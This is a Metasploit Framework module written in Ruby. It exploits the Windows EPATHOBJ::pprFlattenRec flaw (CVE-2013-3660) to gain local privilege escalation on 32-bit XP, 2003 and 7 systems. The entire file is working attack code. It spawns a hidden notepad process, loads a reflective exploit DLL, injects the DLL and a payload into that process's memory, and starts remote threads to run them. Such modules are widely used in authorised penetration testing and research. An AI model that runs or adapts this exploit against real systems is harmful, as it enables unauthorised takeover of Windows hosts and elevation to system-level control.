##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/process'

class Metasploit3 < Msf::Exploit::Local
	Rank = AverageRanking

	include Msf::Post::File
	include Msf::Post::Windows::Priv
	include Msf::Post::Windows::Process

	def initialize(info={})
		super(update_info(info, {
			'Name'           => 'Windows EPATHOBJ::pprFlattenRec Local Privilege Escalation',
			'Description'    => %q{
					This module exploits a vulnerability on EPATHOBJ::pprFlattenRec due to the usage
				of uninitialized data which allows to corrupt memory. At the moment, the module has
				been tested successfully on Windows XP SP3, Windows 2003 SP1, and Windows 7 SP1.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Tavis Ormandy <taviso[at]cmpxchg8b.com>', # Vulnerability discovery and Original Exploit
					'progmboy <programmeboy[at]gmail.com>',    # Original Exploit
					'Keebie4e',    # Metasploit integration
					'egypt',       # Metasploit integration
					'sinn3r',      # Metasploit integration
					'juan vazquez' # Metasploit integration
				],
			'Arch'           => ARCH_X86,
			'Platform'       => 'win',
			'SessionTypes'   => [ 'meterpreter' ],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Targets'        =>
				[
					[ 'Automatic', { } ]
				],
			'Payload'        =>
				{
					'Space'       => 4096,
					'DisableNops' => true
				},
			'References'     =>
				[
					[ 'CVE', '2013-3660' ],
					[ 'EDB', '25912' ],
					[ 'OSVDB', '93539' ],
					[ 'URL', 'http://seclists.org/fulldisclosure/2013/May/91' ],
				],
			'DisclosureDate' => 'May 15 2013',
			'DefaultTarget'  => 0
		}))

	end

	def check
		os = sysinfo["OS"]
		if os =~ /windows/i
			return Exploit::CheckCode::Vulnerable
		end
	end

	def create_proc()
		windir = expand_path("%windir%")
		# Select path of executable to run depending the architecture
		if sysinfo['Architecture'] =~ /x86/
			cmd = "#{windir}\\System32\\notepad.exe"
		end
		# run hidden
		proc = session.sys.process.execute(cmd, nil, {'Hidden' => true })
		return proc.pid
	end

	def exploit

		if sysinfo["Architecture"] =~ /wow64/i
			fail_with(Exploit::Failure::NoTarget, "Running against WOW64 is not supported")
		elsif sysinfo["Architecture"] =~ /x64/
			fail_with(Exploit::Failure::NoTarget, "Running against 64-bit systems is not supported")
		end
		dll = ''
		offset = nil
		file = File.join(Msf::Config.install_root, "data", "exploits", "cve-2013-3660", "exploit.dll")
                File.open( file ) { |f| dll += f.read(f.stat.size) }

                pe = Rex::PeParsey::Pe.new( Rex::ImageSource::Memory.new( dll ) )
		
                pe.exports.entries.each do |entry|
                	if( entry.name =~ /^\S*ReflectiveLoader\S*/ )
                        	offset = pe.rva_to_file_offset( entry.rva )
                                break
                        end
                end
	
		print_error("No offset found") unless offset

		new_pid = create_proc

		if not new_pid
			print_error("Filed to create the new process, trying in the current one, if unsuccessful migrate by yourself")
		else
			print_status("New pid #{new_pid}")
		end

		pay = payload.encoded

		print_status("Injecting payload into memory")
		host_process = session.sys.process.open(new_pid.to_i, PROCESS_ALL_ACCESS)
		mem = host_process.memory.allocate(pay.length + (pay.length % 1024))
		host_process.memory.protect(mem)
		host_process.memory.write(mem, pay)

		print_status("Injecting exploit into memory")
		dll_mem = host_process.memory.allocate(dll.length + (dll.length % 1024))
		host_process.memory.protect(dll_mem)
		host_process.memory.write(dll_mem, dll)
	
		print_status("Executing exploit")
		host_process.thread.create(dll_mem+offset, 0)
		print_status("Sleeping some for exploit to complete... Could we implement WaitForSingleObject?")
		print_status("Can we check the uid of a remote process?")
		sleep(15)
		print_status("Executing payload")
		host_process.thread.create(mem,0)
	end

end
